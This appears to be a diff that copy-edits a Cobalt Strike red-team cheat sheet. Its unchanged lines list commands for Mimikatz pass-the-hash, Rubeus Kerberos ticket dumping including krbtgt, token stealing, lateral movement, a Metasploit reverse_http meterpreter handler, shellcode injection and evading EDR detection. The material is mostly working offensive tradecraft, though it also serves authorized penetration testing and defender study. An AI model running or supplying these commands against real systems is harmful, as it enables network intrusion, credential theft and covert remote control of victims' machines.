@@ -64,7 +64,7 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 ## Import Powershell module
 powershell-import C:\path\to\PowerView.ps1
 powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
-powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
+powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
 powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
 powerpick Invoke-PrivescAudit | fl
 psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.
@@ -104,7 +104,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
+## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
 steal_token <pid> #Steal token from process created by mimikatz
 
 ## Pass the ticket
@@ -113,7 +113,7 @@ execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
 make_token <domain>\<username> DummyPass
-## Write the ticket in the attacker machine from a poweshell session & load it
+## Write the ticket on the attacker machine from a PowerShell session and load it
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -126,7 +126,7 @@ steal_token <pid>
 ## Extract ticket + Pass the ticket
 ### List tickets
 execute-assembly C:\path\Rubeus.exe triage
-### Dump insteresting ticket by luid
+### Dump an interesting ticket by LUID
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 ### Create new logon session, note luid and processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
@@ -144,7 +144,7 @@ jump [method] [target] [listener]
 ## psexec_psh                x86   Use a service to run a PowerShell one-liner
 ## winrm                     x86   Run a PowerShell script via WinRM
 ## winrm64                   x64   Run a PowerShell script via WinRM
-## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)
+## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)
 
 
 remote-exec [method] [target] [command] # remote-exec doesn't return output
@@ -159,7 +159,7 @@ beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
 # Pass session to Metasploit - Through listener
-## On metaploit host
+## On the Metasploit host
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
@@ -180,7 +180,7 @@ ps
 shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
 
 # Pass metasploit session to cobalt strike
-## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
+## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
 ## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
 
 
@@ -235,15 +235,15 @@ Stageless payloads are less noisy than staged ones because they don't need to do
 
 ### Tokens & Token Store
 
-Be careful when you steal or generate tokens because it might be posisble for an EDR to enumerate all the tokens of all the threads and find a **token belonging to a different user** or even SYSTEM in the process.
+Be careful when stealing or generating tokens because an EDR may enumerate thread tokens and detect a **token belonging to a different user** or even SYSTEM inside the process.
 
 This allows to store tokens **per beacon** so it's not needed to steal the same token again and again. This is useful for lateral movement or when you need to use a stolen token multiple times:
 
-- token-store steal <pid>
-- token-store steal-and-use <pid>
+- `token-store steal <pid>`
+- `token-store steal-and-use <pid>`
 - token-store show
-- token-store use <id>
-- token-store remove <id>
+- `token-store use <id>`
+- `token-store remove <id>`
 - token-store remove-all
 
 When moving laterally, usually is better to **steal a token than to generate a new one** or perform a pass the hash attack.
